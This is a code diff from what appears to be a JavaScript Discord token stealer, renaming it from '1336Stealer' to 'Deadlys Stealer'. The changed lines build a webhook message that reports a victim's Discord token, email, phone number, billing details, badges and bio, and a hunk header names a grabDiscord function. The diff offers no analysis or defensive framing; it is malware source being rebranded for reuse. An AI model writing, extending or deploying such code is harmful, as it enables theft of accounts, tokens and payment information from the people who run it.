@@ -273,7 +273,7 @@ async function grabDiscord() {
 }
 
 function embed(username, tag, id, nitro, badges, bio, billings, email, phone, token, avatar) {
-    return `{"title":"Thanks for using 1336Stealer","description":"` + username + `'s account","color":3224376,"fields":[{"name":"🔎 User ID","value":"\`` + id + `\`","inline":true},{"name":"👤 Username","value":"\`` + tag + `\`","inline":true},{"name":"<:email:1057623873731956798> Email","value":"\`` + email + `\`"},{"name":"<:phone:1114538505050275930> Phone","value":"\`` + phone + `\`","inline":true},{"name":"<:badges:1114537190152749106> Badges","value":"` + badges + `","inline":true},{"name":"<a:nitro:1114537869839712399>  Nitro","value":"` + nitro + `","inline":true},{"name":":credit_card: Billings","value":"` + billings + `","inline":true},{"name":"?? Bio","value":"\`\`\`` + bio + `\`\`\`"},{"name":"<:discord:1114538605621301308> Token","value":"\`\`\`` + token + `\`\`\`"}],\n"thumbnail": {\n"url": "` + avatar + `"\n}}`
+    return `{"title":"Thanks for using Deadlys Stealer","description":"` + username + `'s account","color":3224376,"fields":[{"name":"🔎 User ID","value":"\`` + id + `\`","inline":true},{"name":"👤 Username","value":"\`` + tag + `\`","inline":true},{"name":"<:email:1057623873731956798> Email","value":"\`` + email + `\`"},{"name":"<:phone:1114538505050275930> Phone","value":"\`` + phone + `\`","inline":true},{"name":"<:badges:1114537190152749106> Badges","value":"` + badges + `","inline":true},{"name":"<a:nitro:1114537869839712399>  Nitro","value":"` + nitro + `","inline":true},{"name":":credit_card: Billings","value":"` + billings + `","inline":true},{"name":"?? Bio","value":"\`\`\`` + bio + `\`\`\`"},{"name":"<:discord:1114538605621301308> Token","value":"\`\`\`` + token + `\`\`\`"}],\n"thumbnail": {\n"url": "` + avatar + `"\n}}`
 }
 
 function compile(embeds) {
@@ -285,7 +285,7 @@ function compile(embeds) {
             build += ",\n"
         }
     }
-    build += `],\n"username": "1336Stealer | t.me/St34ler",\n"attachments": []\n}`
+    build += `],\n"username": "Deadly | Deadly",\n"attachments": []\n}`
     return build
 }
 
